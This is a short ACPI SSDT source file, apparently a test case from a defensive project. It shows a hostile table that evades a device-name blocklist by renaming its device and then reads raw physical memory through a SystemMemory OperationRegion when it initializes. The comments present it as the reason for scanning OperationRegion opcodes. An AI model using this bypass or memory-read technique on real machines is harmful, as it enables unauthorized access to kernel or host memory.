/*
    Step 1 bypass: Defeats device name blocklist by renaming "FAKE" to "EVIL".

    The original payload used Device(FAKE) which was caught by the name
    blocklist. Simply renaming the device bypasses this check entirely --
    the same OperationRegion(SystemMemory) attack works unchanged.

    This motivates Step 1's defense: scanning OperationRegion opcodes
    instead of relying on device names.
*/

DefinitionBlock ("", "SSDT", 6, "BADAML", "BYPASS01", 0x20250225)
{
    Scope (\_SB)
    {
        Device (EVIL)
        {
            Name (_HID, "MSFT0003")

            // Same SystemMemory attack as the original -- just a different
            // device name.
            OperationRegion (INRD, SystemMemory, 0x40000000, 64)
            Field (INRD, AnyAcc, NoLock, Preserve)
            {
                ADDR,   64,
            }

            Method (_INI, 0, Serialized)
            {
                Debug = "BYPASS01: renamed device, same attack"
                Local0 = ToInteger(ADDR)
                Debug = Local0
            }
        }
    }
}
